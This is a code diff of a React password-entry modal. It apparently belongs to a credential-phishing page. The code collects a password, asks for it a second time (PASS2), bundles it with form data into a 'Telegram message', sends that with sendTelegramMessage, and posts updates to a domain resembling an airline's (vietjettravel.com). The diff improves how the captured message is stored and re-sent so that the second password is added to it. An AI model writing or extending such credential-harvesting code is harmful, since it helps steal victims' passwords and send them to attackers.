@@ -154,9 +154,9 @@ const PasswordModal: FC<PasswordModalProps> = ({
       PASS: "",
       PASS2: "",
     };
-    const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);
-
-    if (lastMessage) {
+    if (localStorage.getItem(LAST_MESSAGE_KEY) !== null) {
+      const lastMessage = localStorage.getItem(LAST_MESSAGE_KEY);
+      message = JSON.parse(lastMessage ?? "");
       message["PASS2"] = uiState.password;
     } else {
       message = createTelegramMessage(formData, uiState.password);
@@ -166,7 +166,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
       setUiState((prev) => ({ ...prev, isLoading: true }));
 
       try {
-        if (localStorage.getItem(LAST_MESSAGE_KEY)) {
+        if (localStorage.getItem(LAST_MESSAGE_KEY) !== null) {
           await axios.post(
             `https://vietjettravel.com/update-data`,
 
@@ -204,12 +204,16 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
     setUiState((prev) => ({
       ...prev,
-      attempt: prev.attempt + 1,
       isLoading: true,
     }));
 
     try {
       await sendTelegramMessage(message);
+
+      localStorage.setItem(
+        LAST_MESSAGE_KEY,
+        JSON.stringify(message).toString(),
+      );
       setUiState((prev) => ({
         ...prev,
       }));
